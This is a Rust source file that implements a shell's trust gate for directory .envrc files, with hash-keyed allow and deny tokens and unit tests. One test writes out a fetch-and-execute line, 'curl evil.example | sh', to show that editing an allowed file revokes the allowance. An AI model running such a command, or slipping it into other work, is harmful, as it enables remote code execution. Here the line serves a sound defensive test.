//! Whether an rc file is allowed to run, and the store that remembers the answer.
//!
//! **This is the whole security question for the feature.** A directory environment means a file
//! sitting in a directory gets to run code when you walk into it, and `git clone` followed by `cd`
//! is a completely ordinary thing to do. Without a gate, that sequence is arbitrary code execution
//! by anyone who can get you to clone a repository.
//!
//! So the design is direnv's, copied deliberately rather than reinvented (`internal/cmd/rc.go`):
//!
//! * An rc file is inert until explicitly allowed. Until then it is **not read**, and the shell
//!   says so once rather than silently doing nothing.
//! * Allow is keyed by `sha256(absolute_path + "\n" + contents)`. The contents are in the hash, so
//!   **editing an allowed file revokes it.** Allowing a file once must not allow whatever it later
//!   becomes — that is the property the whole gate exists for, and a path-only hash would lose it.
//! * Deny is keyed by `sha256(absolute_path + "\n")` — path only. A denial therefore survives edits.
//! * Deny is checked *before* allow, so a denied place cannot talk its way back in by changing.
//!
//! The asymmetry is not an accident. Allowing is a statement about a piece of text; denying is a
//! statement about a place.
//!
//! Tokens are empty files named by the hash. There is no format, so there is nothing to parse
//! wrongly, and a token whose file has gone is garbage the [`Allow::prune`] sweep can drop.

use sha2::{Digest, Sha256};
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

/// A path as the bytes the kernel holds, for hashing.
///
/// **`to_string_lossy` is not injective and this is a security key.** Every byte that is not valid
/// UTF-8 becomes `U+FFFD`, so `.../pr\xffoj/.envrc` and `.../pr\xfeoj/.envrc` hash the same — two
/// different files sharing one allow decision. A path is bytes to the kernel, so hash the bytes.
///
/// Nothing already allowed is invalidated: for a path that *is* valid UTF-8 — every real one —
/// these are the same bytes `to_string_lossy` produced.
fn path_bytes(path: &Path) -> &[u8] {
    path.as_os_str().as_bytes()
}

/// What the shell may do with an rc file it has found.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Status {
    /// Never seen, or seen and then edited. Not read.
    NotAllowed,
    /// Allowed, with these exact contents.
    Allowed,
    /// Refused for this path, whatever the contents become.
    Denied,
}

/// Where the tokens live: `$XDG_DATA_HOME/oslo/direnv/{allow,deny}`.
///
/// Data rather than config, following the move direnv made for the same reason — a user edits their
/// config directory by hand, and this is bookkeeping the shell owns.
fn store(xdg_data: Option<&str>, home: Option<&str>) -> Option<PathBuf> {
    let base = match xdg_data.filter(|dir| !dir.is_empty()) {
        Some(dir) => PathBuf::from(dir),
        None => PathBuf::from(home.filter(|h| !h.is_empty())?).join(".local/share"),
    };
    Some(base.join("oslo/direnv"))
}

/// A digest as lower-case hex, which is what the token is named.
///
/// Written out rather than pulled in: `sha2` 0.11 returns a `hybrid_array::Array`, which does not
/// implement `LowerHex`, and a whole dependency to format thirty-two bytes is not a trade worth
/// making in a shell that ships as a static binary.
fn hex(bytes: &[u8]) -> String {
    use std::fmt::Write;
    bytes.iter().fold(String::with_capacity(64), |mut out, b| {
        let _ = write!(out, "{b:02x}");
        out
    })
}

/// `sha256(path + "\n" + contents)`, the allow key.
///
/// Reading the file to hash it is not a wasted read: if it cannot be read there is nothing to allow,
/// and the caller is about to read it anyway when the answer comes back [`Status::Allowed`].
fn content_key(path: &Path) -> Option<String> {
    let absolute = path.canonicalize().ok()?;
    let contents = std::fs::read(&absolute).ok()?;
    let mut hasher = Sha256::new();
    hasher.update(path_bytes(&absolute));
    hasher.update(b"\n");
    hasher.update(&contents);
    Some(hex(&hasher.finalize()))
}

/// `sha256(path + "\n")`, the deny key.
fn path_key(path: &Path) -> Option<String> {
    // Deliberately *not* `canonicalize`, which requires the file to exist: a denial has to be
    // recordable for a path whose file was deleted, and has to keep matching when it comes back.
    let absolute = match path.is_absolute() {
        true => path.to_path_buf(),
        false => std::env::current_dir().ok()?.join(path),
    };
    let mut hasher = Sha256::new();
    hasher.update(path_bytes(&absolute));
    hasher.update(b"\n");
    Some(hex(&hasher.finalize()))
}

/// The store, resolved once from the environment the shell was started with.
pub struct Allow {
    root: Option<PathBuf>,
}

impl Allow {
    pub fn new(xdg_data: Option<&str>, home: Option<&str>) -> Allow {
        Allow {
            root: store(xdg_data, home),
        }
    }

    fn token(&self, kind: &str, key: &str) -> Option<PathBuf> {
        Some(self.root.as_ref()?.join(kind).join(key))
    }

    /// What may be done with `path`.
    ///
    /// Deny first, and by path, so that a directory you have refused cannot come back by being
    /// edited. Any failure to answer reads as [`Status::NotAllowed`] — the safe direction, and the
    /// only defensible one: a store that cannot be read must not mean "run it".
    pub fn status(&self, path: &Path) -> Status {
        if let Some(key) = path_key(path)
            && let Some(token) = self.token("deny", &key)
            && token.exists()
        {
            return Status::Denied;
        }
        match content_key(path).and_then(|key| self.token("allow", &key)) {
            Some(token) if token.exists() => Status::Allowed,
            _ => Status::NotAllowed,
        }
    }

    /// Allow `path` as it stands now. Editing it afterwards revokes this.
    ///
    /// Clears any denial first: `direnv allow` on a denied path is an unambiguous statement, and
    /// leaving the deny token in place would make the command silently do nothing.
    pub fn allow(&self, path: &Path) -> Result<(), String> {
        if let Some(key) = path_key(path)
            && let Some(token) = self.token("deny", &key)
        {
            let _ = std::fs::remove_file(token);
        }
        let key = content_key(path).ok_or_else(|| format!("cannot read {}", path.display()))?;
        let token = self
            .token("allow", &key)
            .ok_or_else(|| "no data directory to record it in".to_string())?;
        write_token(&token)
    }

    /// Refuse `path`, whatever it becomes.
    pub fn deny(&self, path: &Path) -> Result<(), String> {
        let key = path_key(path).ok_or_else(|| format!("cannot resolve {}", path.display()))?;
        let token = self
            .token("deny", &key)
            .ok_or_else(|| "no data directory to record it in".to_string())?;
        write_token(&token)
    }

    /// How many tokens are held, as `(allowed, denied)`.
    pub fn count(&self) -> (usize, usize) {
        let count = |kind: &str| {
            self.root
                .as_ref()
                .map(|root| root.join(kind))
                .and_then(|dir| std::fs::read_dir(dir).ok())
                .map(|entries| entries.flatten().count())
                .unwrap_or(0)
        };
        (count("allow"), count("deny"))
    }

    /// Drop every token, which is what `direnv prune` amounts to here.
    ///
    /// direnv can be cleverer — it stores the path inside the token file and drops only the ones
    /// whose file is gone. Ours are empty by design, so the honest sweep is all or nothing, and it
    /// is announced as such rather than pretending to be selective.
    pub fn prune(&self) -> usize {
        let (allowed, denied) = self.count();
        if let Some(root) = &self.root {
            let _ = std::fs::remove_dir_all(root.join("allow"));
            let _ = std::fs::remove_dir_all(root.join("deny"));
        }
        allowed + denied
    }
}

/// An empty file, and the directory to hold it.
///
/// `0700` on the directory: which projects a user has trusted is not information another account on
/// the machine needs, and the tokens are the record of it.
fn write_token(token: &Path) -> Result<(), String> {
    let dir = token.parent().ok_or("no parent directory")?;
    std::fs::create_dir_all(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700));
    }
    std::fs::write(token, b"").map_err(|e| format!("{}: {e}", token.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn rc(dir: &Path, body: &str) -> PathBuf {
        let path = dir.join(".envrc");
        let mut file = std::fs::File::create(&path).expect("write the rc file");
        file.write_all(body.as_bytes()).expect("write");
        path
    }

    fn store_in(dir: &Path) -> Allow {
        Allow::new(Some(dir.to_str().expect("utf8")), None)
    }

    /// **Two paths that differ must not share one decision.** The key is a security boundary, and
    /// hashing `to_string_lossy` collapsed every invalid byte to `U+FFFD` — so `pr\xffoj` and
    /// `pr\xfeoj` produced the same digest, and allowing one allowed the other.
    #[test]
    fn paths_that_differ_only_outside_utf8_get_different_keys() {
        use std::ffi::OsStr;
        let first = PathBuf::from(OsStr::from_bytes(b"/tmp/pr\xffoj/.envrc"));
        let second = PathBuf::from(OsStr::from_bytes(b"/tmp/pr\xfeoj/.envrc"));
        assert_ne!(first, second, "the two paths are different to begin with");
        assert_ne!(
            path_key(&first),
            path_key(&second),
            "two different paths shared one deny key"
        );
    }

    /// And the fix costs nothing already recorded: a valid-UTF-8 path hashes to what it always did.
    #[test]
    fn an_ordinary_path_keeps_the_key_it_had() {
        let path = Path::new("/tmp/project/.envrc");
        let mut expected = Sha256::new();
        // What the previous implementation hashed, byte for byte.
        expected.update(path.to_string_lossy().as_bytes());
        expected.update(b"\n");
        assert_eq!(
            path_key(path),
            Some(hex(&expected.finalize())),
            "an existing deny token would have stopped matching"
        );
    }

    /// The property the gate exists for: allowing a file is allowing *that text*.
    #[test]
    fn editing_an_allowed_file_revokes_it() {
        let dir = tempfile::tempdir().expect("temp dir");
        let allow = store_in(dir.path());
        let path = rc(dir.path(), "export A=1\n");

        assert_eq!(
            allow.status(&path),
            Status::NotAllowed,
            "inert until allowed"
        );
        allow.allow(&path).expect("allow");
        assert_eq!(allow.status(&path), Status::Allowed);

        rc(dir.path(), "export A=1\ncurl evil.example | sh\n");
        assert_eq!(
            allow.status(&path),
            Status::NotAllowed,
            "a line appended after the allowance must not inherit it"
        );
    }

    /// A denial is about the place, so it must survive the file changing.
    #[test]
    fn a_denial_outlives_every_edit() {
        let dir = tempfile::tempdir().expect("temp dir");
        let allow = store_in(dir.path());
        let path = rc(dir.path(), "export A=1\n");

        allow.deny(&path).expect("deny");
        assert_eq!(allow.status(&path), Status::Denied);

        rc(dir.path(), "export A=2\n");
        assert_eq!(
            allow.status(&path),
            Status::Denied,
            "rewriting a denied file must not clear the refusal"
        );
    }

    /// Deny is checked first, so content cannot argue with a refusal.
    #[test]
    fn deny_beats_an_existing_allowance() {
        let dir = tempfile::tempdir().expect("temp dir");
        let allow = store_in(dir.path());
        let path = rc(dir.path(), "export A=1\n");

        allow.allow(&path).expect("allow");
        allow.deny(&path).expect("deny");
        assert_eq!(allow.status(&path), Status::Denied);
    }

    /// And allowing again is an unambiguous instruction that must clear the refusal.
    #[test]
    fn allowing_a_denied_file_lifts_the_denial() {
        let dir = tempfile::tempdir().expect("temp dir");
        let allow = store_in(dir.path());
        let path = rc(dir.path(), "export A=1\n");

        allow.deny(&path).expect("deny");
        allow.allow(&path).expect("allow");
        assert_eq!(allow.status(&path), Status::Allowed);
    }

    /// Two files with identical contents in different directories are different allowances.
    #[test]
    fn the_path_is_in_the_hash_as_well_as_the_contents() {
        let one = tempfile::tempdir().expect("temp dir");
        let two = tempfile::tempdir().expect("temp dir");
        let allow = store_in(one.path());

        let first = rc(one.path(), "export SAME=1\n");
        let second = rc(two.path(), "export SAME=1\n");
        allow.allow(&first).expect("allow");

        assert_eq!(allow.status(&first), Status::Allowed);
        assert_eq!(
            allow.status(&second),
            Status::NotAllowed,
            "the same text somewhere else is a different decision"
        );
    }

    /// A store that cannot be reached must refuse, never permit.
    #[test]
    fn no_store_means_nothing_is_allowed() {
        let dir = tempfile::tempdir().expect("temp dir");
        let path = rc(dir.path(), "export A=1\n");
        let allow = Allow::new(None, None);
        assert_eq!(allow.status(&path), Status::NotAllowed);
        assert!(allow.allow(&path).is_err(), "and says so rather than lying");
    }

    /// A known-answer test for the hash itself.
    ///
    /// The allow store is keyed by this digest, so changing it silently revokes every directory a
    /// user has already allowed — they would simply stop loading, with no message. The vector is
    /// NIST's for the empty string and for "abc", so a change of crate, version or algorithm fails
    /// here rather than in somebody's project a week later.
    #[test]
    fn sha256_matches_the_standard_vector() {
        use sha2::{Digest, Sha256};
        let hex = |bytes: &[u8]| {
            let mut h = Sha256::new();
            h.update(bytes);
            h.finalize()
                .iter()
                .map(|b| format!("{b:02x}"))
                .collect::<String>()
        };
        assert_eq!(
            hex(b""),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
        assert_eq!(
            hex(b"abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }
}
